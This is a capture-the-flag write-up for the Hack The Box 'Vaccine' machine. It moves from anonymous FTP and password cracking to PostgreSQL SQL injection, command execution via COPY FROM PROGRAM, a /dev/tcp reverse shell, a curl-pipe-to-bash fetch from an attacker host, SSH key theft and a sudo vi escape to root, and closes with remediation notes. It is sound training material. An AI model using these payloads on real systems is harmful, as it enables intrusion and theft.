# Hack The Box — Vaccine Writeup

## General Information

| Field           | Value                                                                                                         |
| --------------- | ------------------------------------------------------------------------------------------------------------- |
| Platform        | Hack The Box                                                                                                  |
| Machine         | Vaccine                                                                                                       |
| OS              | Linux                                                                                                         |
| Difficulty      | Very Easy                                                                                                     |
| Target IP       | `<TARGET_IP>`                                                                                                 |
| Main Techniques | FTP Enumeration, Password Cracking, Web Enumeration, PostgreSQL SQL Injection, RCE, Sudo Privilege Escalation |

---

## Summary

Vaccine is a Linux machine from Hack The Box where the initial foothold starts with anonymous FTP access. The FTP server exposes a password-protected ZIP backup containing the source code of the web application.

After cracking the ZIP password, the PHP source reveals a hardcoded admin login check using an MD5 hash. Once the hash is cracked, we can access the dashboard. The dashboard search functionality is vulnerable to PostgreSQL SQL injection.

The SQL injection allows us to enumerate the database and, because the PostgreSQL user has high privileges, abuse `COPY FROM PROGRAM` to achieve command execution as the `postgres` user. Finally, privilege escalation is achieved by abusing a sudo rule that allows `postgres` to run `vi` as root against a specific PostgreSQL configuration file.

---

# Reconnaissance

We start with a basic TCP port scan to identify open ports:

```bash
nmap -sS --min-rate 5000 -Pn -n -p- -oN allports <TARGET_IP>
```

The scan shows three open ports:

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Then we run a more detailed scan against those ports:

```bash
nmap -sS --min-rate 5000 -Pn -n -sVC -p21,22,80 -oN targeted <TARGET_IP>
```

Relevant output:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
|_-rwxr-xr-x    1 0 0 2533 Apr 13 2021 backup.zip

22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu

80/tcp open  http    Apache httpd 2.4.41
|_http-title: MegaCorp Login
```

The important finding is that FTP allows anonymous login and contains a file called `backup.zip`.

---

# FTP Enumeration

We connect to FTP anonymously:

```bash
ftp anonymous@<TARGET_IP>
```

Inside the FTP server, we list the files:

```ftp
ls
```

We find:

```text
backup.zip
```

We download it:

```ftp
get backup.zip
```

Then exit FTP:

```ftp
bye
```

The file is password-protected, so we need to crack it.

---

# Cracking the ZIP Password

First, we extract a hash from the ZIP file using `zip2john`:

```bash
zip2john backup.zip > hash.txt
```

Then we crack it with John and the `rockyou.txt` wordlist:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

To display the cracked password:

```bash
john --show hash.txt
```

Output:

```text
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
```

So the ZIP password is:

```text
741852963
```

We extract the ZIP:

```bash
unzip backup.zip
```

The extracted files are:

```text
index.php
style.css
```

---

# Web Source Code Review

The important file is `index.php`.

Inside the source code, we find the login logic:

```php
if(isset($_POST['username']) && isset($_POST['password'])) {
  if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
    $_SESSION['login'] = "true";
    header("Location: dashboard.php");
  }
}
```

The username is hardcoded:

```text
admin
```

The password is not stored directly, but we have an MD5 hash:

```text
2cb42f8734ea607eefed3b70af13bbd3
```

We crack it using an online hash database or a local wordlist attack.

The recovered credentials are:

```text
admin:qwerty789
```

Using these credentials, we log into the web application.

---

# SQL Injection Discovery

After logging in, we reach the dashboard. The page contains a search feature for a car catalogue.

Testing a single quote in the search parameter causes a PostgreSQL error:

```text
ERROR: unterminated quoted string at or near "'"
```

This suggests that user input is being concatenated directly into a SQL query.

From the later source code, the vulnerable line is:

```php
$q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
```

This confirms that the `search` parameter is vulnerable to SQL injection.

The query structure is:

```sql
SELECT * FROM cars WHERE name ILIKE '%<USER_INPUT>%'
```

To confirm boolean-based injection:

```sql
' AND 1=1-- -
```

and:

```sql
' AND 1=2-- -
```

The first payload returns results, while the second does not, confirming SQL injection.

---

# Finding the Number of Columns

We test `UNION SELECT` payloads until we find the correct number of columns.

The working payload uses five columns, with the third column reflected in the page:

```text
/dashboard.php?search=' AND 1=2 UNION SELECT NULL,NULL,version(),NULL,NULL-- -
```

URL-encoded:

```text
http://<TARGET_IP>/dashboard.php?search=%27%20AND%201%3D2%20UNION%20SELECT%20NULL,NULL,version(),NULL,NULL--%20-
```

The page returns the PostgreSQL version:

```text
PostgreSQL 11.7
```

This confirms:

```text
Database: PostgreSQL
Columns: 5
Visible column: 3
```

From this point, the base SQLi template is:

```sql
' AND 1=2 UNION SELECT NULL,NULL,<PAYLOAD>,NULL,NULL-- -
```

---

# Database Enumeration

We enumerate the current database:

```sql
' AND 1=2 UNION SELECT NULL,NULL,current_database(),NULL,NULL-- -
```

We enumerate databases:

```sql
' AND 1=2 UNION SELECT NULL,NULL,string_agg(datname,CHR(10)),NULL,NULL FROM pg_database-- -
```

Example result:

```text
postgres
carsdb
template1
template0
```

The relevant database is:

```text
carsdb
```

Then we enumerate tables:

```sql
' AND 1=2 UNION SELECT NULL,NULL,string_agg(table_schema||'.'||table_name,CHR(10)),NULL,NULL
FROM information_schema.tables
WHERE table_schema NOT IN ('pg_catalog','information_schema')-- -
```

Result:

```text
public.cars
public.cmd_output
```

The `cmd_output` table was created later during command execution testing. The actual application table is:

```text
public.cars
```

We can dump rows using:

```sql
' AND 1=2 UNION SELECT NULL,NULL,string_agg(row_to_json(cars)::text,CHR(10)),NULL,NULL FROM cars-- -
```

Example output:

```json
{"id":1,"name":"Elixir","type":"Sports","fueltype":"Petrol","engine":"2000cc"}
```

---

# Checking PostgreSQL Privileges

PostgreSQL has a dangerous feature called `COPY FROM PROGRAM`, which can execute system commands if the database user has sufficient privileges.

First, we check the current PostgreSQL user:

```sql
' AND 1=2 UNION SELECT NULL,NULL,current_user,NULL,NULL-- -
```

Then we check whether the user is a superuser:

```sql
' AND 1=2 UNION SELECT NULL,NULL,usesuper::text,NULL,NULL
FROM pg_user
WHERE usename=current_user-- -
```

We also check whether it has the `pg_execute_server_program` role:

```sql
' AND 1=2 UNION SELECT NULL,NULL,pg_has_role(current_user,$$pg_execute_server_program$$,$$member$$)::text,NULL,NULL-- -
```

Both checks return `true`, which means we can abuse `COPY FROM PROGRAM` for command execution.

---

# Remote Code Execution with PostgreSQL

To capture command output, we create a table called `cmd_output` and use `COPY FROM PROGRAM`.

First, we test command execution with `whoami`:

```text
http://<TARGET_IP>/dashboard.php?search=%27%3BDROP%20TABLE%20IF%20EXISTS%20cmd_output%3BCREATE%20TABLE%20cmd_output%28line%20text%29%3BCOPY%20cmd_output%20FROM%20PROGRAM%20%24%24whoami%24%24%3B--%20-
```

Decoded SQL:

```sql
';DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(line text);
COPY cmd_output FROM PROGRAM $$whoami$$;
-- -
```

Then we read the output using the SQL injection:

```text
http://<TARGET_IP>/dashboard.php?search=%27%20AND%201%3D2%20UNION%20SELECT%20NULL,NULL,string_agg%28line,CHR%2810%29%29,NULL,NULL%20FROM%20cmd_output--%20-
```

Decoded SQL:

```sql
' AND 1=2 UNION SELECT NULL,NULL,string_agg(line,CHR(10)),NULL,NULL FROM cmd_output-- -
```

The output is:

```text
postgres
```

This confirms command execution as the `postgres` user.

---

# Reverse Shell

Before sending the reverse shell, we validate outbound connectivity from the target to our machine.

On the attacker machine:

```bash
python3 -m http.server 8080 --bind 0.0.0.0
```

Then we trigger a simple curl from the target:

```text
http://<TARGET_IP>/dashboard.php?search=%27%3BDROP%20TABLE%20IF%20EXISTS%20cmd_output%3BCREATE%20TABLE%20cmd_output%28line%20text%29%3BCOPY%20cmd_output%20FROM%20PROGRAM%20%24%24curl%20-m%205%20http%3A%2F%2F<ATTACKER_IP>%3A8080%2Fping%24%24%3B--%20-
```

If the HTTP server receives a request for `/ping`, outbound connectivity works.

Now we prepare a reverse shell file on the attacker machine:

```bash
nano reverse
```

Content:

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

Start the HTTP server in the same directory:

```bash
python3 -m http.server 8080 --bind 0.0.0.0
```

Start a listener:

```bash
nc -lvnp 4444
```

Now trigger the reverse shell:

```text
http://<TARGET_IP>/dashboard.php?search=%27%3BDROP%20TABLE%20IF%20EXISTS%20cmd_output%3BCREATE%20TABLE%20cmd_output%28line%20text%29%3BCOPY%20cmd_output%20FROM%20PROGRAM%20%24%24bash%20-c%20%27curl%20-fsSL%20http%3A%2F%2F<ATTACKER_IP>%3A8080%2Freverse%20%7C%20bash%27%24%24%3B--%20-
```

Decoded SQL:

```sql
';DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(line text);
COPY cmd_output FROM PROGRAM $$bash -c 'curl -fsSL http://<ATTACKER_IP>:8080/reverse | bash'$$;
-- -
```

We receive a shell as:

```text
postgres
```

---

# Shell Stabilization

The initial reverse shell is limited, so we stabilize it.

On the reverse shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press:

```text
Ctrl + Z
```

On the attacker machine:

```bash
stty raw -echo; fg
```

Press Enter, then inside the shell:

```bash
export TERM=xterm
stty rows 40 columns 120
```

Now we have a more usable shell.

---

# User Flag

As the `postgres` user, we can retrieve the user flag.

```bash
cat /var/lib/postgresql/user.txt
```

Flag:

```text
[REDACTED]
```

---

# Post-Exploitation Enumeration

Inside the web directory, we inspect `dashboard.php`:

```bash
cd /var/www/html
cat dashboard.php
```

The file contains PostgreSQL credentials:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Credentials:

```text
postgres:P@s5w0rd!
```

We can also check SSH material for the `postgres` user:

```bash
ls -la /var/lib/postgresql/.ssh
```

Files found:

```text
authorized_keys
id_rsa
id_rsa.pub
```

If needed, we can copy the private key to our machine and connect through SSH:

```bash
cat /var/lib/postgresql/.ssh/id_rsa
```

Save the key locally as `id_rsa` and set the correct permissions:

```bash
chmod 600 id_rsa
```

Then connect:

```bash
ssh -i id_rsa postgres@<TARGET_IP>
```

Alternatively, if password login is enabled:

```bash
ssh postgres@<TARGET_IP>
```

Password:

```text
P@s5w0rd!
```

---

# Privilege Escalation

The hint for the machine asks:

```text
What program can the postgres user run as root using sudo?
```

Using the discovered password, we check sudo privileges:

```bash
sudo -l
```

Output:

```text
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

This means the `postgres` user can run `vi` as root, but only with the exact file path specified.

A common mistake is running:

```bash
sudo /bin/vi
```

This fails because the sudo rule does not allow `/bin/vi` by itself.

The correct command is:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside `vi`, we can spawn a shell:

```vim
:!/bin/bash
```

This gives us a root shell.

We confirm:

```bash
whoami
id
```

Expected output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

---

# Root Flag

Finally, we read the root flag:

```bash
cat /root/root.txt
```

Flag:

```text
[REDACTED]
```

---

# Remediation Notes

The exploitation path worked because of several security issues:

1. Anonymous FTP exposed a sensitive backup file.
2. The ZIP password was weak and crackable.
3. The web application used a weak MD5 password hash.
4. The dashboard built SQL queries through string concatenation.
5. PostgreSQL ran with excessive privileges.
6. `COPY FROM PROGRAM` was available to the database user.
7. Database credentials were hardcoded in PHP source code.
8. The `postgres` user had a dangerous sudo rule allowing `vi` as root.

Recommended fixes:

```text
- Disable anonymous FTP access.
- Do not expose source-code backups publicly.
- Use strong password hashing such as bcrypt or Argon2.
- Use prepared statements for SQL queries.
- Do not run database users as PostgreSQL superusers.
- Revoke dangerous roles such as pg_execute_server_program.
- Move secrets to protected environment/configuration stores.
- Avoid granting sudo access to interactive editors such as vi, vim, nano, less, or more.
```

---

# Key Takeaways

This machine demonstrates how a small information leak can turn into full compromise:

```text
Anonymous FTP
→ backup.zip
→ source code disclosure
→ cracked admin password
→ SQL injection
→ PostgreSQL RCE
→ shell as postgres
→ hardcoded credentials
→ sudo vi privilege escalation
→ root
```

The most important lesson is that web vulnerabilities become much more dangerous when database users have excessive privileges.
